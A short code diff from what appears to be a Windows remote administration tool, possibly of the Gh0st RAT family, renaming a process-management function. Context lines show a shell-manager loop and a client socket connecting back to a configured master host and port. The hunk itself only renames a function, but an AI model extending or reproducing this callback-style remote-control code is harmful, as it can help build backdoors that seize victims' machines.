@@ -46,7 +46,7 @@ DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 }
 
 // 进程管理
-DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
+DWORD WINAPI Loop_ProcessManager(SOCKET sRemote)
 {
 	CClientSocket	socketClient;
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
